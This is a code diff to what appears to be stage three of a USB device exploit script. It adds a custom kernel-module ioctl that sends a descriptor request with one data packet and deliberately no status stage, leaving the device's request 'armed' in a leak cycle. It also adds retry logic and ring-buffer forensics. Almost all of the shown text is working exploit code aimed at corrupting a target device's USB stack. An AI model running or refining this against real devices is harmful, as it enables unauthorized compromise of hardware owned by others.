@@ -69,17 +69,44 @@ def main():
         return 1
     print('[stage3] device open:', usb.describe(dev))
 
-    # ---- B1: armed critical-IN (module push, no status TRB) ----------
+    # ---- B1: armed critical-IN via the CYC halt-recovery leak cycle ----
+    # raw0_cyc: push SETUP+one 0x40 data TRB with NO status -> the xHC runs
+    # SETUP + one IN packet, then halts at the missing status; the device's
+    # io_request stays armed (no status token ever hits the wire), and the
+    # module recovers the ring with Set TR Dequeue Pointer. This is the
+    # sketch's "stops issuing IN tokens after exactly one packet" shape.
+    import fcntl as _f0
+    import struct as _s0
+    IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
     crit_setup = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
-    rc = R.raw0_push(crit_setup, b'\x00' * 0x41, has_data=1, has_status=0,
-                     dir_in=1, fd=fd_raw)
-    print('[stage3] armed crit-IN push: rc=%d' % rc)
-    if rc != 0:
-        # ring forensics: is the ring view healthy enough to retry?
+    cyc_buf = (b'\x00' * 0x40)
+
+    def cyc(setup, data, settle_us=1000):
+        import ctypes as _ct
+        arr = (_ct.c_ubyte * max(len(data), 1)).from_buffer_copy(
+            bytes(data) if data else b'\x00')
+        txn = _s0.pack('<8sIBBHIIQ',
+                       setup, len(data), 1, 1, 0, settle_us, 0,
+                       _ct.addressof(arr))
         try:
-            import fcntl as _f
-            import struct as _s
-            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+            _f0.ioctl(fd_raw, IOC_CYC, txn, True)
+            _ = arr  # keep alive across the ioctl
+            return 0
+        except OSError as e:
+            _ = arr
+            return -e.errno
+
+    rc = cyc(crit_setup, cyc_buf)
+    print('[stage3] armed crit-IN CYC: rc=%d (0=recovered, 1=ran-clean, '
+          '<0=error)' % rc)
+    if rc < 0:
+        time.sleep(0.5)
+        rc = cyc(crit_setup, cyc_buf)
+        print('[stage3] armed crit-IN CYC retry: rc=%d' % rc)
+    if rc < 0:
+        print('[stage3] CYC failed - see ring dump below')
+        # ring forensics on failure
+        try:
             import importlib.util as _ilu
             _sp = _ilu.spec_from_file_location(
                 'pf', os.path.join(os.path.dirname(os.path.abspath(__file__)),
@@ -87,8 +114,9 @@ def main():
             PF = _ilu.module_from_spec(_sp)
             _sp.loader.exec_module(PF)
             buf = bytearray(PF.RD_SIZE)
+            import fcntl as _f
             _f.ioctl(fd_raw, PF.IOC_RINGDUMP, buf, True)
-            vals = _s.unpack("<%dI" % (PF.RD_SIZE // 4), bytes(buf))
+            vals = _s0.unpack("<%dI" % (PF.RD_SIZE // 4), bytes(buf))
             head = dict(enq=vals[0], cyc=vals[1], hwdeq=vals[2],
                         epst=vals[3], slot=vals[4])
             print('[ring] enq=%d cyc=%d hwdeq=0x%x epst=0x%x slot=%d'
@@ -97,12 +125,6 @@ def main():
             PF.pr_rows(vals, head, 0, 8)
         except Exception as e:
             print('[ring] dump failed: %r' % (e,))
-        time.sleep(0.5)
-        rc = R.raw0_push(crit_setup, b'\x00' * 0x41, has_data=1,
-                         has_status=0, dir_in=1, fd=fd_raw)
-        print('[stage3] armed crit-IN retry: rc=%d' % rc)
-    if rc != 0:
-        print('[stage3] push failed twice - fresh module load + dance needed')
         return 1
 
     usb.claim(handle)
